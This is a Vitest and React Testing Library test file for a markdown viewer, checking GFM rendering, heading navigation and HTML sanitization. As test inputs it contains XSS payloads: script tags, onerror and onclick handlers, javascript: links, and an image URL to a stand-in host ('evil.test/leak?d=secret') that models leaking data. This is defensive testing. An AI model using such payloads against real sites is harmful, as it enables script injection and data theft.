// @vitest-environment jsdom
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { MarkdownViewer } from "./MarkdownViewer.tsx";
import { ID_PREFIX, renderDocument, sanitize } from "./viewer-engine.ts";

afterEach(cleanup);

function dom(html: string): HTMLElement {
  const root = document.createElement("div");
  root.innerHTML = html;
  return root;
}

describe("viewer engine (docs/SECURITY.md T10)", () => {
  it("renders GFM, highlighting, and folded front matter", () => {
    const { html, headings } = renderDocument(
      [
        "---",
        "title: Plan",
        "---",
        "# Plan",
        "",
        "## Steps",
        "",
        "- [x] done",
        "- [ ] next",
        "",
        "| a | b |",
        "| - | - |",
        "| 1 | 2 |",
        "",
        "> [!NOTE]",
        "> Read this.",
        "",
        "```ts",
        "const x = 1;",
        "```",
        "",
        'He said "no" -- twice.',
      ].join("\n"),
    );
    const root = dom(html);
    expect(root.querySelector("details.front-matter")?.hasAttribute("open")).toBe(false);
    expect(root.querySelector("details.front-matter")?.textContent).toContain("Plan");
    expect(root.querySelectorAll(".task-list-item-checkbox")).toHaveLength(2);
    expect(root.querySelector(":scope > table td")?.textContent).toBe("1");
    expect(root.querySelector(".markdown-alert-note")).not.toBeNull();
    expect(root.querySelector("pre code .hljs-keyword")?.textContent).toBe("const");
    // Quotes and dashes stay as the agent wrote them.
    expect(root.textContent).toContain('He said "no" -- twice.');
    expect(headings.map((h) => [h.level, h.text, h.id])).toEqual([
      [1, "Plan", "plan"],
      [2, "Steps", "steps"],
    ]);
  });

  it("prefixes ids so a document cannot reuse the app's", () => {
    const root = dom(renderDocument("# root").html);
    expect(root.querySelector("h1")?.id).toBe(`${ID_PREFIX}root`);
  });

  it.each([
    "<script>window.pwned = 1</script>",
    '<img src=x onerror="window.pwned=1">',
    '<iframe src="https://evil.test"></iframe>',
    '<div onclick="alert(1)">click</div>',
    "<style>body{display:none}</style>",
  ])("shows raw HTML as text: %s", (source) => {
    const root = dom(renderDocument(source).html);
    expect(root.querySelector("script, img, iframe, style, [onclick], [onerror]")).toBeNull();
    expect(root.textContent).toContain(source);
  });

  it("never keeps an image, so nothing is fetched", () => {
    const root = dom(renderDocument("![chart](https://evil.test/leak?d=secret)").html);
    expect(root.querySelector("img")).toBeNull();
  });

  it("drops javascript: links", () => {
    const root = dom(renderDocument("[x](javascript:alert(1))").html);
    expect(root.querySelector('a[href^="javascript"]')).toBeNull();
  });

  it("cleans what plugins produce, not only the source", () => {
    const root = dom(
      sanitize(
        '<p style="color:red" onmouseover="x()">a</p><svg><script>x()</script></svg>' +
          '<img src="https://evil.test"><form action="https://evil.test"><button>b</button></form>' +
          '<a href="https://ok.test" data-file-path="src/a.ts">ok</a>',
      ),
    );
    expect(root.querySelector("[style], [onmouseover], svg, script, img, form, button")).toBeNull();
    expect(root.querySelector("a")?.getAttribute("href")).toBe("https://ok.test");
    expect(root.querySelector("a")?.dataset.filePath).toBe("src/a.ts");
  });
});

describe("MarkdownViewer", () => {
  const doc = "# Plan\n\nIntro.\n\n## Steps\n\nDo it.\n";

  it("renders, then shows the source under Raw", async () => {
    const { container } = render(<MarkdownViewer text={doc} title="/ws/docs/plan.md" />);
    expect(await screen.findByRole("heading", { name: "Steps" })).toBeTruthy();
    expect(screen.getByText("plan.md").getAttribute("title")).toBe("/ws/docs/plan.md");

    fireEvent.click(screen.getByRole("tab", { name: "Raw" }));
    expect(screen.getByRole("tab", { name: "Raw" }).getAttribute("aria-selected")).toBe("true");
    expect(container.querySelector("h2")).toBeNull();
    expect(container.querySelector("pre code")?.textContent).toBe(doc);

    fireEvent.click(screen.getByRole("tab", { name: "Rendered" }));
    expect(container.querySelector("h2")?.textContent).toBe("Steps");
  });

  it("lists the headings and scrolls to one", async () => {
    const scroll = vi.fn();
    Element.prototype.scrollIntoView = scroll;
    render(<MarkdownViewer text={doc} />);
    const contents = await screen.findByRole("navigation", { name: "Contents" });
    const steps = Array.from(contents.querySelectorAll("button")).find(
      (b) => b.textContent === "Steps",
    )!;
    act(() => steps.click());
    expect(scroll).toHaveBeenCalledTimes(1);
    expect((scroll.mock.contexts[0] as Element).id).toBe(`${ID_PREFIX}steps`);
  });

  it("shows no contents list for a single heading", async () => {
    render(<MarkdownViewer text={"# Only\n\ntext"} />);
    await screen.findByRole("heading", { name: "Only" });
    expect(screen.queryByRole("navigation", { name: "Contents" })).toBeNull();
  });
});
